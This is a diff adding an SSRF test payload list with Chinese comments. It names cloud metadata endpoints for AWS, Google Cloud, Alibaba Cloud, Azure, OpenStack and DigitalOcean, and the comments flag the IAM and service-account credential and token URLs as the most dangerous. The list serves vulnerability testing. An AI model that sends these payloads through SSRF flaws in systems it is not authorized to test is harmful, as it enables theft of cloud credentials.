@@ -1,0 +1,57 @@
+# 云服务元数据接口
+# 用于测试云环境中的SSRF漏洞
+# 扫描会自动跳过空格和注释
+
+# ========== AWS 元数据 ==========
+# 基本元数据
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# IAM 凭证（最危险）
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/info
+
+# 实例信息
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-ipv4
+http://169.254.169.254/latest/meta-data/local-ipv4
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/meta-data/instance-type
+http://169.254.169.254/latest/meta-data/ami-id
+
+# ========== Google Cloud 元数据 ==========
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# 使用 Metadata-Flavor header（需要客户端支持）
+# Header: Metadata-Flavor: Google
+
+# ========== 阿里云元数据 ==========
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/region-id
+http://100.100.100.200/latest/meta-data/zone-id
+http://100.100.100.200/latest/meta-data/private-ipv4
+http://100.100.100.200/latest/meta-data/image-id
+http://100.100.100.200/latest/meta-data/ram/security-credentials/
+
+# ========== Azure 元数据 ==========
+# 需要 Metadata: true header
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+
+# ========== OpenStack 元数据 ==========
+http://169.254.169.254/openstack/latest/meta_data.json
+http://169.254.169.254/openstack/latest/user_data
+
+# ========== Digital Ocean 元数据 ==========
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
